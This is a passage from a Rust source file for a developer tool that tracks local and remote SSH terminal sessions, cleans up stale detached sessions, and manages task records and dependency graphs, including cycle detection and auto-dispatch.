        Uuid::parse_str(&row.id).map_err(|_| format!("invalid session id {}", row.id))?;
    let next = remote_session_row_from_status(
        RemoteSessionRowSeed {
            project_id: project_uuid,
            session_id: session_uuid,
            name: row.name.clone(),
            session_type: row.r#type.clone(),
            connection_id: row.connection_id.clone().unwrap_or_default(),
            cwd: row.cwd.clone(),
            command: row.command.clone(),
            started_at: row.started_at,
        },
        status,
    );
    if next.status != row.status || next.lifecycle_state != row.lifecycle_state {
        append_event(
            db,
            project_uuid,
            None,
            Some(session_uuid),
            "session",
            "SessionStateChanged",
            json!({
                "backend": SESSION_BACKEND_REMOTE_SSH_DURABLE,
                "from_status": row.status,
                "to_status": next.status,
                "from_lifecycle_state": row.lifecycle_state,
                "to_lifecycle_state": next.lifecycle_state,
            }),
        )
        .await;
        match next.lifecycle_state.as_str() {
            SESSION_LIFECYCLE_DETACHED => {
                append_event(
                    db,
                    project_uuid,
                    None,
                    Some(session_uuid),
                    "session",
                    "SessionDetached",
                    json!({"backend": SESSION_BACKEND_REMOTE_SSH_DURABLE}),
                )
                .await;
            }
            SESSION_LIFECYCLE_ATTACHED => {
                append_event(
                    db,
                    project_uuid,
                    None,
                    Some(session_uuid),
                    "session",
                    "SessionReattached",
                    json!({"backend": SESSION_BACKEND_REMOTE_SSH_DURABLE}),
                )
                .await;
            }
            SESSION_LIFECYCLE_LOST => {
                append_event(
                    db,
                    project_uuid,
                    None,
                    Some(session_uuid),
                    "session",
                    "SessionLost",
                    json!({"backend": SESSION_BACKEND_REMOTE_SSH_DURABLE}),
                )
                .await;
            }
            _ => {}
        }
    }
    db.upsert_session(&next).await.map_err(|e| e.to_string())?;
    Ok(next)
}

fn remote_session_startup_grace_active(row: &SessionRow) -> bool {
    if !remote_session_is_live(row) {
        return false;
    }

    let age = Utc::now().signed_duration_since(row.started_at);
    age >= chrono::Duration::zero()
        && age <= chrono::Duration::seconds(REMOTE_SESSION_STATUS_STARTUP_GRACE_WINDOW_SECS)
}

async fn reconcile_persisted_sessions(
    db: &Db,
    project_id: Uuid,
    project_path: &Path,
    state: &AppState,
) -> Result<Vec<SessionRow>, String> {
    let rows = db
        .list_sessions(&project_id.to_string())
        .await
        .map_err(|e| e.to_string())?;

    // Separate remote live sessions from others for batch processing.
    let mut remote_live: Vec<SessionRow> = Vec::new();
    let mut remote_nonlive: Vec<SessionRow> = Vec::new();
    let mut local: Vec<SessionRow> = Vec::new();
    for row in rows {
        if is_remote_ssh_durable_backend(&row.backend) {
            if remote_session_is_live(&row) {
                remote_live.push(row);
            } else {
                remote_nonlive.push(row);
            }
        } else {
            local.push(row);
        }
    }

    let mut out = Vec::new();

    // Batch-query remote sessions grouped by connection_id.
    let mut groups: HashMap<String, Vec<SessionRow>> = HashMap::new();
    for row in remote_live {
        let key = row.connection_id.clone().unwrap_or_default();
        groups.entry(key).or_default().push(row);
    }
    for (connection_id, group_rows) in groups {
        // Try batch query via session.list RPC.
        let batch_result = try_batch_remote_status(state, db, &connection_id).await;
        for mut row in group_rows {
            row = match &batch_result {
                Some(batch_statuses) => {
                    let remote_id = row.remote_session_id.as_deref().unwrap_or(row.id.as_str());
                    if let Some(status) = batch_statuses.iter().find(|s| s.session_id == remote_id)
                    {
                        match apply_remote_session_status(db, &row, status).await {
                            Ok(refreshed) => refreshed,
                            Err(error) => {
                                mark_remote_session_row_lost(
                                    db,
                                    &row,
                                    error,
                                    "reconcile_persisted_sessions",
                                )
                                .await?
                            }
                        }
                    } else {
                        // Session not in batch result — fall back to individual query.
                        match refresh_remote_session_row(state, db, &row).await {
                            Ok(refreshed) => refreshed,
                            Err(error) => {
                                mark_remote_session_row_lost(
                                    db,
                                    &row,
                                    error,
                                    "reconcile_persisted_sessions",
                                )
                                .await?
                            }
                        }
                    }
                }
                None => {
                    // Batch unavailable — fall back to per-session SSH.
                    match refresh_remote_session_row(state, db, &row).await {
                        Ok(refreshed) => refreshed,
                        Err(error) => {
                            mark_remote_session_row_lost(
                                db,
                                &row,
                                error,
                                "reconcile_persisted_sessions",
                            )
                            .await?
                        }
                    }
                }
            };
            out.push(row);
        }
    }

    // Pass through remote non-live sessions unchanged.
    out.extend(remote_nonlive);

    // Process local sessions.
    let stale_threshold = Utc::now() - chrono::Duration::hours(24);
    for mut row in local {
        if row.status == "running" || row.status == "waiting" {
            let alive = session_backend_alive(project_path, &row.id).await;

            // Stale session cleanup: if a local durable session has been
            // detached for over 24 hours, terminate it to prevent pile-up.
            if alive
                && row.backend == SESSION_BACKEND_LOCAL_DURABLE
                && row
                    .detached_at
                    .as_ref()
                    .and_then(|dt| {
                        if *dt < stale_threshold {
                            Some(())
                        } else {
                            None
                        }
                    })
                    .is_some()
            {
                tracing::info!(
                    session_id = %row.id,
                    "cleaning up stale local durable session (>24h detached)"
                );
                // Kill only this specific session via its runner PID, not the daemon.
                let runner_pid_path = project_path
                    .join(".pnevma/data/local-durable/sessions")
                    .join(&row.id)
                    .join("runner.pid");
                if let Ok(contents) = tokio::fs::read_to_string(&runner_pid_path).await {
                    if let Ok(pid) = contents.trim().parse::<u32>() {
                        let _ = TokioCommand::new("kill")
                            .args(["-TERM", &pid.to_string()])
                            .stdin(std::process::Stdio::null())
                            .stdout(std::process::Stdio::null())
                            .stderr(std::process::Stdio::null())
                            .status()
                            .await;
                    }
                }
                // Mark as terminated.
                row.status = "complete".to_string();
                row.lifecycle_state = "exited".to_string();
                row.pid = None;
                row.last_heartbeat = Utc::now();
                row.ended_at = Some(Utc::now().to_rfc3339());
                row.last_error = Some("stale session cleaned up (>24h detached)".to_string());
                db.upsert_session(&row).await.map_err(|e| e.to_string())?;
                out.push(row);
                continue;
            }

            row.status = if alive {
                "waiting".to_string()
            } else {
                "complete".to_string()
            };
            row.lifecycle_state = if alive {
                "detached".to_string()
            } else {
                "exited".to_string()
            };
            row.pid = None;
            row.last_heartbeat = Utc::now();
            // Only set detached_at if it wasn't already set, so the stale
            // session TTL counts from the original detach, not every project open.
            if alive && row.detached_at.is_none() {
                row.detached_at = Some(Utc::now());
            } else if !alive {
                row.detached_at = None;
            }
            row.last_error =
                (!alive).then(|| "session backend not available during restore".to_string());
            db.upsert_session(&row).await.map_err(|e| e.to_string())?;
        }
        out.push(row);
    }

    Ok(out)
}

async fn try_batch_remote_status(
    state: &AppState,
    db: &Db,
    connection_id: &str,
) -> Option<Vec<pnevma_ssh::RemoteSessionStatus>> {
    let profile = resolve_ssh_profile_by_id(state, Some(db), connection_id)
        .await
        .ok()
        .flatten()?;
    pnevma_ssh::list_remote_sessions(&profile).await.ok()
}

fn session_status_to_string(status: &SessionStatus) -> String {
    match status {
        SessionStatus::Running => "running".to_string(),
        SessionStatus::Waiting => "waiting".to_string(),
        SessionStatus::Error => "error".to_string(),
        SessionStatus::Complete => "complete".to_string(),
    }
}

fn session_health_to_string(health: &SessionHealth) -> String {
    match health {
        SessionHealth::Active => "active".to_string(),
        SessionHealth::Idle => "idle".to_string(),
        SessionHealth::Stuck => "stuck".to_string(),
        SessionHealth::Waiting => "waiting".to_string(),
        SessionHealth::Error => "error".to_string(),
        SessionHealth::Complete => "complete".to_string(),
    }
}

fn parse_session_status(status: &str) -> SessionStatus {
    match status {
        "running" => SessionStatus::Running,
        "waiting" => SessionStatus::Waiting,
        "error" => SessionStatus::Error,
        _ => SessionStatus::Complete,
    }
}

fn parse_session_health(status: &str) -> SessionHealth {
    match status {
        "running" => SessionHealth::Waiting,
        "waiting" => SessionHealth::Waiting,
        "error" => SessionHealth::Error,
        _ => SessionHealth::Complete,
    }
}

fn session_row_from_meta(meta: &SessionMetadata) -> SessionRow {
    let status = session_status_to_string(&meta.status);
    SessionRow {
        id: meta.id.to_string(),
        project_id: meta.project_id.to_string(),
        name: meta.name.clone(),
        r#type: Some("terminal".to_string()),
        backend: meta.backend_kind.clone(),
        durability: meta.durability.clone(),
        lifecycle_state: session_lifecycle_state_for_status(&status),
        status,
        pid: meta.pid.map(i64::from),
        cwd: meta.cwd.clone(),
        command: meta.command.clone(),
        branch: meta.branch.clone(),
        worktree_id: meta.worktree_id.map(|v| v.to_string()),
        connection_id: None,
        remote_session_id: None,
        controller_id: None,
        started_at: meta.started_at,
        last_heartbeat: meta.last_heartbeat,
        last_output_at: Some(meta.last_heartbeat),
        detached_at: if matches!(meta.status, SessionStatus::Waiting) {
            Some(meta.last_heartbeat)
        } else {
            None
        },
        last_error: None,
        restore_status: None,
        exit_code: meta.exit_code.map(i64::from),
        ended_at: meta.ended_at.map(|value| value.to_rfc3339()),
    }
}

struct RemoteSessionRowSeed {
    project_id: Uuid,
    session_id: Uuid,
    name: String,
    session_type: Option<String>,
    connection_id: String,
    cwd: String,
    command: String,
    started_at: DateTime<Utc>,
}

fn remote_session_row_from_status(
    seed: RemoteSessionRowSeed,
    status: &pnevma_ssh::RemoteSessionStatus,
) -> SessionRow {
    let (row_status, lifecycle_state) = remote_session_state_mapping(&status.state);
    let terminal_lifecycle = matches!(
        lifecycle_state.as_str(),
        SESSION_LIFECYCLE_EXITED | SESSION_LIFECYCLE_LOST | SESSION_LIFECYCLE_ERROR
    );
    let last_output_at = status
        .last_output_at_epoch
        .and_then(|epoch| DateTime::<Utc>::from_timestamp(epoch, 0));
    let detached_at = matches!(
        lifecycle_state.as_str(),
        SESSION_LIFECYCLE_DETACHED | SESSION_LIFECYCLE_REATTACHING
    )
    .then(Utc::now);
    SessionRow {
        id: seed.session_id.to_string(),
        project_id: seed.project_id.to_string(),
        name: seed.name,
        r#type: seed.session_type,
        backend: SESSION_BACKEND_REMOTE_SSH_DURABLE.to_string(),
        durability: SESSION_DURABILITY_DURABLE.to_string(),
        lifecycle_state,
        status: row_status,
        pid: status.pid.map(i64::from),
        cwd: seed.cwd,
        command: seed.command,
        branch: None,
        worktree_id: None,
        connection_id: Some(seed.connection_id),
        remote_session_id: Some(status.session_id.clone()),
        controller_id: Some(status.controller_id.clone()),
        started_at: seed.started_at,
        last_heartbeat: Utc::now(),
        last_output_at,
        detached_at,
        last_error: remote_session_last_error_for_state(&status.state),
        restore_status: Some(status.state.clone()),
        exit_code: status.exit_code.map(i64::from),
        ended_at: terminal_lifecycle.then(|| Utc::now().to_rfc3339()),
    }
}

pub(crate) struct CreateRemoteManagedSessionInput<'a> {
    pub db: &'a Db,
    pub project_id: Uuid,
    pub name: String,
    pub session_type: Option<String>,
    pub profile: &'a pnevma_ssh::SshProfile,
    pub connection_id: String,
    pub cwd: String,
    pub command: Option<String>,
}

pub(crate) async fn create_remote_managed_session(
    input: CreateRemoteManagedSessionInput<'_>,
) -> Result<SessionRow, String> {
    let CreateRemoteManagedSessionInput {
        db,
        project_id,
        name,
        session_type,
        profile,
        connection_id,
        cwd,
        command,
    } = input;
    let session_id = Uuid::new_v4();
    let command_string = command.clone().unwrap_or_default();
    let helper = pnevma_ssh::ensure_remote_helper(profile)
        .await
        .map_err(|e| e.to_string())?;
    if helper.installed {
        append_event(
            db,
            project_id,
            None,
            Some(session_id),
            "session",
            "SessionHelperInstalled",
            json!({
                "backend": SESSION_BACKEND_REMOTE_SSH_DURABLE,
                "connection_id": connection_id,
                "controller_id": helper.health.controller_id,
                "helper_path": helper.health.helper_path,
                "helper_kind": helper.health.helper_kind,
                "artifact_sha256": helper.health.artifact_sha256,
                "artifact_source": helper.health.artifact_source,
                "target_triple": helper.health.target_triple,
                "protocol_compatible": helper.health.protocol_compatible,
                "protocol_version": helper.health.protocol_version,
                "install_kind": helper.install_kind.as_str(),
                "missing_dependencies": helper.health.missing_dependencies,
                "version": helper.health.version,
            }),
        )
        .await;
    }
    append_event(
        db,
        project_id,
        None,
        Some(session_id),
        "session",
        "SessionHelperHealthChecked",
        json!({
            "backend": SESSION_BACKEND_REMOTE_SSH_DURABLE,
            "connection_id": connection_id,
            "controller_id": helper.health.controller_id,
            "helper_path": helper.health.helper_path,
            "helper_kind": helper.health.helper_kind,
            "healthy": helper.health.healthy,
            "artifact_sha256": helper.health.artifact_sha256,
            "artifact_source": helper.health.artifact_source,
            "target_triple": helper.health.target_triple,
            "protocol_compatible": helper.health.protocol_compatible,
            "protocol_version": helper.health.protocol_version,
            "missing_dependencies": helper.health.missing_dependencies,
            "version": helper.health.version,
        }),
    )
    .await;

    let created = pnevma_ssh::create_remote_session(
        profile,
        &session_id.to_string(),
        &cwd,
        command.as_deref(),
    )
    .await
    .map_err(|e| e.to_string())?;
    let started_at = Utc::now();
    let initial_status = pnevma_ssh::RemoteSessionStatus {
        session_id: created.session_id.clone(),
        controller_id: created.controller_id.clone(),
        state: created.state.clone(),
        pid: created.pid,
        exit_code: None,
        total_bytes: 0,
        last_output_at_epoch: None,
    };
    let row = remote_session_row_from_status(
        RemoteSessionRowSeed {
            project_id,
            session_id,
            name: name.clone(),
            session_type,
            connection_id: connection_id.clone(),
            cwd: cwd.clone(),
            command: command_string.clone(),
            started_at,
        },
        &initial_status,
    );
    db.upsert_session(&row).await.map_err(|e| e.to_string())?;

    append_event(
        db,
        project_id,
        None,
        Some(session_id),
        "session",
        "SessionControllerStarted",
        json!({
            "backend": SESSION_BACKEND_REMOTE_SSH_DURABLE,
            "connection_id": connection_id,
            "controller_id": created.controller_id,
        }),
    )
    .await;
    append_event(
        db,
        project_id,
        None,
        Some(session_id),
        "session",
        "SessionCreated",
        json!({
            "backend": SESSION_BACKEND_REMOTE_SSH_DURABLE,
            "connection_id": connection_id,
            "cwd": cwd,
            "command": command_string,
            "remote_session_id": created.session_id,
            "state": created.state,
        }),
    )
    .await;

    Ok(row)
}

fn live_session_view_from_meta(meta: &SessionMetadata) -> LiveSessionView {
    LiveSessionView {
        id: meta.id.to_string(),
        name: meta.name.clone(),
        backend: meta.backend_kind.clone(),
        durability: meta.durability.clone(),
        lifecycle_state: session_lifecycle_state_for_status(&session_status_to_string(
            &meta.status,
        )),
        status: session_status_to_string(&meta.status),
        health: session_health_to_string(&meta.health),
        pid: meta.pid.map(i64::from),
        cwd: meta.cwd.clone(),
        command: meta.command.clone(),
        started_at: meta.started_at,
        last_heartbeat: meta.last_heartbeat,
        exit_code: meta.exit_code,
        ended_at: meta.ended_at,
    }
}

fn live_session_view_from_row(row: &SessionRow) -> LiveSessionView {
    LiveSessionView {
        id: row.id.clone(),
        name: row.name.clone(),
        backend: row.backend.clone(),
        durability: row.durability.clone(),
        lifecycle_state: row.lifecycle_state.clone(),
        status: row.status.clone(),
        health: match row.status.as_str() {
            "running" => "active".to_string(),
            "waiting" => "waiting".to_string(),
            "error" => "error".to_string(),
            _ => "complete".to_string(),
        },
        pid: row.pid,
        cwd: row.cwd.clone(),
        command: row.command.clone(),
        started_at: row.started_at,
        last_heartbeat: row.last_heartbeat,
        exit_code: row.exit_code.map(|value| value as i32),
        ended_at: parse_optional_datetime(&row.ended_at),
    }
}

fn session_meta_from_row(row: &SessionRow, data_root: &Path) -> Option<SessionMetadata> {
    let session_id = Uuid::parse_str(&row.id).ok()?;
    let project_id = Uuid::parse_str(&row.project_id).ok()?;

    let mut status = parse_session_status(&row.status);
    let mut health = parse_session_health(&row.status);
    if status == SessionStatus::Running {
        status = SessionStatus::Waiting;
        health = SessionHealth::Waiting;
    }

    Some(SessionMetadata {
        id: session_id,
        project_id,
        name: row.name.clone(),
        status,
        health,
        pid: row.pid.map(|v| v as u32),
        cwd: row.cwd.clone(),
        command: row.command.clone(),
        branch: row.branch.clone(),
        worktree_id: row
            .worktree_id
            .as_ref()
            .and_then(|v| Uuid::parse_str(v).ok()),
        started_at: row.started_at,
        last_heartbeat: row.last_heartbeat,
        scrollback_path: data_root
            .join("scrollback")
            .join(format!("{}.log", row.id))
            .to_string_lossy()
            .to_string(),
        exit_code: row.exit_code.map(|value| value as i32),
        ended_at: parse_optional_datetime(&row.ended_at),
        backend_kind: row.backend.clone(),
        durability: row.durability.clone(),
    })
}

pub(crate) fn task_row_to_contract(row: &TaskRow) -> Result<TaskContract, String> {
    let scope: Vec<String> = serde_json::from_str(&row.scope_json).map_err(|e| e.to_string())?;
    let dependencies: Vec<String> =
        serde_json::from_str(&row.dependencies_json).map_err(|e| e.to_string())?;
    let acceptance_criteria: Vec<Check> =
        serde_json::from_str(&row.acceptance_json).map_err(|e| e.to_string())?;
    let constraints: Vec<String> =
        serde_json::from_str(&row.constraints_json).map_err(|e| e.to_string())?;
    let id = Uuid::parse_str(&row.id).map_err(|e| e.to_string())?;

    Ok(TaskContract {
        id,
        title: row.title.clone(),
        goal: row.goal.clone(),
        scope,
        out_of_scope: Vec::new(),
        dependencies: dependencies
            .iter()
            .filter_map(|dep| Uuid::parse_str(dep).ok())
            .collect(),
        acceptance_criteria,
        constraints,
        priority: map_priority(&row.priority),
        status: parse_status(&row.status),
        assigned_session: None,
        branch: row.branch.clone(),
        worktree: row.worktree_id.clone(),
        prompt_pack: None,
        handoff_summary: row.handoff_summary.clone(),
        auto_dispatch: row.auto_dispatch,
        agent_profile_override: row.agent_profile_override.clone(),
        execution_mode: row
            .execution_mode
            .as_deref()
            .and_then(|s| serde_json::from_value(serde_json::Value::String(s.to_string())).ok()),
        timeout_minutes: row.timeout_minutes.map(|v| v as u32),
        max_retries: row.max_retries,
        loop_iteration: row.loop_iteration as u32,
        loop_context_json: row.loop_context_json.clone(),
        // External source is stored in a separate DB table (task_external_sources)
        // and populated by the automation runner at dispatch time, not during row conversion.
        external_source: None,
        created_at: row.created_at,
        updated_at: row.updated_at,
    })
}

pub(crate) fn task_contract_to_row(
    task: &TaskContract,
    project_id: &str,
) -> Result<TaskRow, String> {
    Ok(TaskRow {
        id: task.id.to_string(),
        project_id: project_id.to_string(),
        title: task.title.clone(),
        goal: task.goal.clone(),
        scope_json: serde_json::to_string(&task.scope).map_err(|e| e.to_string())?,
        dependencies_json: serde_json::to_string(
            &task
                .dependencies
                .iter()
                .map(ToString::to_string)
                .collect::<Vec<_>>(),
        )
        .map_err(|e| e.to_string())?,
        acceptance_json: serde_json::to_string(&task.acceptance_criteria)
            .map_err(|e| e.to_string())?,
        constraints_json: serde_json::to_string(&task.constraints).map_err(|e| e.to_string())?,
        priority: map_priority_str(&task.priority).to_string(),
        status: status_to_str(&task.status).to_string(),
        branch: task.branch.clone(),
        worktree_id: task.worktree.clone(),
        handoff_summary: task.handoff_summary.clone(),
        created_at: task.created_at,
        updated_at: task.updated_at,
        auto_dispatch: task.auto_dispatch,
        agent_profile_override: task.agent_profile_override.clone(),
        execution_mode: task.execution_mode.map(|m| {
            serde_json::to_value(m)
                .ok()
                .and_then(|v| v.as_str().map(String::from))
                .unwrap_or_default()
        }),
        timeout_minutes: task.timeout_minutes.map(|v| v as i64),
        max_retries: task.max_retries,
        loop_iteration: task.loop_iteration as i64,
        loop_context_json: task.loop_context_json.clone(),
        forked_from_task_id: None,
        lineage_summary: None,
        lineage_depth: 0,
    })
}

fn task_row_to_view(row: TaskRow, cost_usd: Option<f64>) -> Result<TaskView, String> {
    let scope: Vec<String> = serde_json::from_str(&row.scope_json).map_err(|e| e.to_string())?;
    let dependencies: Vec<String> =
        serde_json::from_str(&row.dependencies_json).map_err(|e| e.to_string())?;
    let acceptance_criteria: Vec<Check> =
        serde_json::from_str(&row.acceptance_json).map_err(|e| e.to_string())?;
    let constraints: Vec<String> =
        serde_json::from_str(&row.constraints_json).map_err(|e| e.to_string())?;

    Ok(TaskView {
        id: row.id,
        project_id: row.project_id,
        title: row.title,
        goal: row.goal,
        scope,
        dependencies,
        acceptance_criteria,
        constraints,
        priority: row.priority,
        status: row.status,
        branch: row.branch,
        worktree_id: row.worktree_id,
        handoff_summary: row.handoff_summary,
        auto_dispatch: row.auto_dispatch,
        agent_profile_override: row.agent_profile_override,
        execution_mode: row.execution_mode,
        timeout_minutes: row.timeout_minutes,
        max_retries: row.max_retries,
        created_at: row.created_at,
        updated_at: row.updated_at,
        queued_position: None,
        cost_usd,
    })
}

/// Emit a `task_updated` event with the full task view when possible.
/// Falls back to just the task_id if fetching/converting the row fails.
pub(crate) async fn emit_enriched_task_event(
    emitter: &Arc<dyn EventEmitter>,
    db: &Db,
    task_id: &str,
) {
    let view = async {
        let row = db.get_task(task_id).await.ok()??;
        let cost = db.task_cost_total(task_id).await.ok();
        task_row_to_view(row, cost).ok()
    }
    .await;
    match view {
        Some(v) => {
            emitter.emit("task_updated", json!({"task": v}));
        }
        None => {
            emitter.emit("task_updated", json!({"task_id": task_id}));
        }
    }
}

/// Build a serializable session view from a SessionRow.
pub(crate) fn session_row_to_event_payload(row: &SessionRow) -> serde_json::Value {
    serde_json::to_value(live_session_view_from_row(row)).expect("LiveSessionView must serialize")
}

pub(crate) async fn load_texts(paths: &[String], project_path: &Path) -> Vec<String> {
    let project_canonical = match project_path.canonicalize() {
        Ok(p) => p,
        Err(_) => return Vec::new(),
    };
    let mut out = Vec::new();
    for path in paths {
        let candidate = if Path::new(path).is_absolute() {
            PathBuf::from(path)
        } else {
            project_path.join(path)
        };
        // Resolve symlinks and verify the path stays within the project root.
        let canonical = match candidate.canonicalize() {
            Ok(p) => p,
            Err(_) => continue,
        };
        if !canonical.starts_with(&project_canonical) {
            tracing::warn!(path = %path, "load_texts: path escapes project root, skipping");
            continue;
        }
        if let Ok(text) = tokio::fs::read_to_string(&canonical).await {
            out.push(text);
        }
    }
    out
}

pub(crate) async fn load_recent_knowledge_summaries(
    db: &Db,
    project_id: Uuid,
    project_path: &Path,
    limit: usize,
) -> Vec<String> {
    let rows = db
        .list_artifacts(&project_id.to_string())
        .await
        .unwrap_or_default();
    let mut out = Vec::new();
    for row in rows.into_iter().filter(|row| {
        row.r#type == "adr" || row.r#type == "changelog" || row.r#type == "convention-update"
    }) {
        if out.len() >= limit {
            break;
        }
        let path = project_path.join(&row.path);
        let text = tokio::fs::read_to_string(path).await.unwrap_or_default();
        if text.trim().is_empty() {
            continue;
        }
        let snippet = text.chars().take(2_000).collect::<String>();
        out.push(format!(
            "artifact_type: {}\nartifact_path: {}\n{}",
            row.r#type, row.path, snippet
        ));
    }
    out
}

pub(crate) async fn emit_task_updated(db: &Db, project_id: Uuid, task_id: Uuid) {
    append_event(
        db,
        project_id,
        Some(task_id),
        None,
        "core",
        "TaskUpdated",
        json!({"task_id": task_id}),
    )
    .await;
}

async fn emit_task_status_changed(
    db: &Db,
    project_id: Uuid,
    task_id: Uuid,
    from: &TaskStatus,
    to: &TaskStatus,
) {
    append_event(
        db,
        project_id,
        Some(task_id),
        None,
        "core",
        "TaskStatusChanged",
        json!({
            "task_id": task_id,
            "from": status_to_str(from),
            "to": status_to_str(to),
            "reason": "dependency_refresh"
        }),
    )
    .await;
}

fn parse_dependency_ids(raw: &[String]) -> Result<Vec<Uuid>, String> {
    let mut out = Vec::with_capacity(raw.len());
    let mut seen = HashSet::with_capacity(raw.len());
    for item in raw {
        let parsed = Uuid::parse_str(item).map_err(|_| format!("invalid dependency id: {item}"))?;
        if seen.insert(parsed) {
            out.push(parsed);
        }
    }
    Ok(out)
}

fn parse_row_dependency_ids(row: &TaskRow) -> Vec<Uuid> {
    serde_json::from_str::<Vec<String>>(&row.dependencies_json)
        .unwrap_or_default()
        .into_iter()
        .filter_map(|dep| Uuid::parse_str(&dep).ok())
        .collect()
}

async fn validate_task_dependencies(
    db: &Db,
    project_id: Uuid,
    task_id: Uuid,
    dependencies: &[Uuid],
) -> Result<(), String> {
    if dependencies.iter().any(|dep| dep == &task_id) {
        return Err("task cannot depend on itself".to_string());
    }

    let rows = db
        .list_tasks(&project_id.to_string())
        .await
        .map_err(|e| e.to_string())?;
    let mut task_ids = rows
        .iter()
        .filter_map(|row| Uuid::parse_str(&row.id).ok())
        .collect::<HashSet<_>>();
    task_ids.insert(task_id);

    for dep in dependencies {
        if !task_ids.contains(dep) {
            return Err(format!("dependency task not found in project: {dep}"));
        }
    }

    let mut graph = HashMap::<Uuid, Vec<Uuid>>::new();
    for row in rows {
        if let Ok(id) = Uuid::parse_str(&row.id) {
            graph.insert(id, parse_row_dependency_ids(&row));
        }
    }
    graph.insert(task_id, dependencies.to_vec());

    for dep in dependencies {
        let mut stack = vec![*dep];
        let mut visited = HashSet::new();
        while let Some(node) = stack.pop() {
            if node == task_id {
                return Err(format!(
                    "dependency cycle detected for task {task_id} via {dep}"
                ));
            }
            if !visited.insert(node) {
                continue;
            }
            if let Some(next) = graph.get(&node) {
                stack.extend(next.iter().copied());
            }
        }
    }

    Ok(())
}

async fn refresh_dependency_states_inner(
    db: &Db,
    project_id: Uuid,
    emitter: Option<&Arc<dyn EventEmitter>>,
    state: Option<&AppState>,
    extra_completed: &[Uuid],
) -> Result<(), String> {
    let mut rows = db
        .list_tasks(&project_id.to_string())
        .await
        .map_err(|e| e.to_string())?;
    for row in &mut rows {
        let persisted = db
            .list_task_dependencies(&row.id)
            .await
            .map_err(|e| e.to_string())?;
        let mut from_json =
            serde_json::from_str::<Vec<String>>(&row.dependencies_json).unwrap_or_default();
        from_json.sort();
        let mut normalized = persisted;
        normalized.sort();
        if from_json != normalized {
            row.dependencies_json =
                serde_json::to_string(&normalized).map_err(|e| e.to_string())?;
            row.updated_at = Utc::now();
            db.update_task(row).await.map_err(|e| e.to_string())?;
        }
    }

    let completed = rows
        .iter()
        .filter(|row| row.status == "Done")
        .filter_map(|row| Uuid::parse_str(&row.id).ok())
        .chain(extra_completed.iter().copied())
        .collect::<HashSet<_>>();

    for row in rows {
        if row.status != "Planned" && row.status != "Ready" && row.status != "Blocked" {
            continue;
        }
        let mut task = task_row_to_contract(&row)?;
        let prev = task.status;
        task.refresh_blocked_status(&completed);
        if prev == TaskStatus::Blocked && task.status == TaskStatus::Planned {
            task.status = TaskStatus::Ready;
            task.updated_at = Utc::now();
        }
        if task.status == prev {
            continue;
        }

        let next = task_contract_to_row(&task, &project_id.to_string())?;
        db.update_task(&next).await.map_err(|e| e.to_string())?;
        emit_task_status_changed(db, project_id, task.id, &prev, &task.status).await;
        emit_task_updated(db, project_id, task.id).await;
        if let Some(emitter) = emitter {
            emit_enriched_task_event(emitter, db, &task.id.to_string()).await;

            // Auto-dispatch: if the task became Ready and has auto_dispatch set, dispatch it.
            if row.auto_dispatch && task.status == TaskStatus::Ready {
                if let Some(state) = state {
                    match dispatch_task(task.id.to_string(), emitter, state).await {
                        Ok(_) => {
                            tracing::info!(task_id = %task.id, "auto-dispatched task on dependency completion")
                        }
                        Err(e) => {
                            tracing::warn!(task_id = %task.id, error = %e, "auto-dispatch failed")
                        }
                    }
                }
            }
        }
    }
    Ok(())
}

pub(crate) async fn refresh_dependency_states(
    db: &Db,
    project_id: Uuid,
    emitter: Option<&Arc<dyn EventEmitter>>,
    state: &AppState,
) -> Result<(), String> {
    refresh_dependency_states_with_extra_completed(
        db,
        project_id,
        emitter,
        Some(state),
        &HashSet::new(),
    )
    .await
}

pub(crate) async fn refresh_dependency_states_with_extra_completed(
    db: &Db,
    project_id: Uuid,
    emitter: Option<&Arc<dyn EventEmitter>>,
    state: Option<&AppState>,
    extra_completed: &HashSet<Uuid>,
) -> Result<(), String> {
    let extra = extra_completed.iter().copied().collect::<Vec<_>>();
    refresh_dependency_states_inner(db, project_id, emitter, state, &extra).await
}

pub(crate) async fn refresh_dependency_states_after_completion(
    db: &Db,
    project_id: Uuid,
    completed_task_id: Uuid,
    emitter: Option<&Arc<dyn EventEmitter>>,
    state: Option<&AppState>,
) -> Result<(), String> {
    refresh_dependency_states_inner(db, project_id, emitter, state, &[completed_task_id]).await
}

pub(crate) async fn refresh_dependency_states_after_completion_without_dispatch(
    db: &Db,
    project_id: Uuid,
    completed_task_id: Uuid,
    emitter: Option<&Arc<dyn EventEmitter>>,
) -> Result<(), String> {
    let mut rows = db
        .list_tasks(&project_id.to_string())
        .await
        .map_err(|e| e.to_string())?;
    for row in &mut rows {
        let persisted = db
            .list_task_dependencies(&row.id)
            .await
            .map_err(|e| e.to_string())?;
        let mut from_json =
            serde_json::from_str::<Vec<String>>(&row.dependencies_json).unwrap_or_default();
        from_json.sort();
        let mut normalized = persisted;
        normalized.sort();
        if from_json != normalized {
            row.dependencies_json =
                serde_json::to_string(&normalized).map_err(|e| e.to_string())?;
            row.updated_at = Utc::now();
            db.update_task(row).await.map_err(|e| e.to_string())?;
        }
    }

    let completed = rows
        .iter()
        .filter(|row| row.status == "Done")
        .filter_map(|row| Uuid::parse_str(&row.id).ok())
        .chain(std::iter::once(completed_task_id))
        .collect::<HashSet<_>>();

    for row in rows {
        if row.status != "Planned" && row.status != "Ready" && row.status != "Blocked" {
            continue;
        }
        let mut task = task_row_to_contract(&row)?;
        let prev = task.status;
        task.refresh_blocked_status(&completed);
        if prev == TaskStatus::Blocked && task.status == TaskStatus::Planned {
            task.status = TaskStatus::Ready;
            task.updated_at = Utc::now();
        }
        if task.status == prev {
            continue;
        }

        let next = task_contract_to_row(&task, &project_id.to_string())?;
        db.update_task(&next).await.map_err(|e| e.to_string())?;
        emit_task_status_changed(db, project_id, task.id, &prev, &task.status).await;
        emit_task_updated(db, project_id, task.id).await;
        if let Some(emitter) = emitter {
            emit_enriched_task_event(emitter, db, &task.id.to_string()).await;
        }
    }

    Ok(())
}

fn required_arg(args: &HashMap<String, String>, key: &str) -> Result<String, String> {
    args.get(key)
        .cloned()
        .filter(|v| !v.trim().is_empty())
        .ok_or_else(|| format!("missing required command arg: {key}"))
}

fn optional_arg(args: &HashMap<String, String>, key: &str) -> Option<String> {
    args.get(key).cloned().filter(|v| !v.trim().is_empty())
}

fn json_value_from_arg(raw: &str) -> serde_json::Value {
    let trimmed = raw.trim();
    if trimmed.eq_ignore_ascii_case("true") {
        serde_json::Value::Bool(true)
    } else if trimmed.eq_ignore_ascii_case("false") {
        serde_json::Value::Bool(false)
    } else if let Ok(value) = trimmed.parse::<i64>() {
        json!(value)
